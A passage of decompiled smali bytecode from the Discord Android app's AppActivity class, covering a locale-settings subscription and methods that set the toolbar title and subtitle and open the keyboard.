    invoke-static/range {v3 .. v11}, Lcom/discord/utilities/rx/ObservableExtensionsKt;->appSubscribe$default(Lrx/Observable;Ljava/lang/Class;Landroid/content/Context;Lkotlin/jvm/functions/Function1;Lkotlin/jvm/functions/Function1;Lkotlin/jvm/functions/Function0;Lkotlin/jvm/functions/Function1;ILjava/lang/Object;)V

    .line 219
    invoke-direct {p0}, Lcom/discord/app/AppActivity;->getUserSettings()Lcom/discord/stores/StoreUserSettings;

    move-result-object v0

    const-string v2, "userSettings"

    invoke-static {v0, v2}, Lkotlin/jvm/internal/j;->g(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v0}, Lcom/discord/stores/StoreUserSettings;->getLocaleObservable()Lrx/Observable;

    move-result-object v0

    .line 221
    invoke-static {v1}, Lcom/discord/app/g;->a(Lcom/discord/app/AppComponent;)Lrx/Observable$Transformer;

    move-result-object v1

    invoke-virtual {v0, v1}, Lrx/Observable;->a(Lrx/Observable$Transformer;)Lrx/Observable;

    move-result-object v2

    const-string v0, "userSettings\n        .lo\u2026AppTransformers.ui(this))"

    invoke-static {v2, v0}, Lkotlin/jvm/internal/j;->g(Ljava/lang/Object;Ljava/lang/String;)V

    .line 222
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v3

    new-instance v0, Lcom/discord/app/AppActivity$i;

    invoke-direct {v0, p0}, Lcom/discord/app/AppActivity$i;-><init>(Lcom/discord/app/AppActivity;)V

    move-object v8, v0

    check-cast v8, Lkotlin/jvm/functions/Function1;

    const/4 v4, 0x0

    const/16 v9, 0x1e

    const/4 v10, 0x0

    invoke-static/range {v2 .. v10}, Lcom/discord/utilities/rx/ObservableExtensionsKt;->appSubscribe$default(Lrx/Observable;Ljava/lang/Class;Landroid/content/Context;Lkotlin/jvm/functions/Function1;Lkotlin/jvm/functions/Function1;Lkotlin/jvm/functions/Function0;Lkotlin/jvm/functions/Function1;ILjava/lang/Object;)V

    return-void
.end method

.method public final setActionBarSubtitle(Ljava/lang/CharSequence;)Lkotlin/Unit;
    .locals 1

    .line 247
    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->dg()Lcom/discord/views/ToolbarTitleLayout;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-virtual {v0, p1}, Lcom/discord/views/ToolbarTitleLayout;->setSubtitle(Ljava/lang/CharSequence;)V

    sget-object p1, Lkotlin/Unit;->bdt:Lkotlin/Unit;

    return-object p1

    :cond_0
    const/4 p1, 0x0

    return-object p1
.end method

.method public final setActionBarTitle(Ljava/lang/CharSequence;)Lkotlin/Unit;
    .locals 1

    .line 241
    invoke-virtual {p0}, Lcom/discord/app/AppActivity;->dg()Lcom/discord/views/ToolbarTitleLayout;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-virtual {v0, p1}, Lcom/discord/views/ToolbarTitleLayout;->setTitle(Ljava/lang/CharSequence;)V

    sget-object p1, Lkotlin/Unit;->bdt:Lkotlin/Unit;

    return-object p1

    :cond_0
    const/4 p1, 0x0

    return-object p1
.end method

.method public final showKeyboard(Landroid/view/View;)V
    .locals 2

    .line 278
    move-object v0, p0

    check-cast v0, Landroid/app/Activity;

    const/4 v1, 0x1

    invoke-static {v0, v1, p1}, Lcom/discord/utilities/keyboard/Keyboard;->setKeyboardOpen(Landroid/app/Activity;ZLandroid/view/View;)V

    return-void
.end method
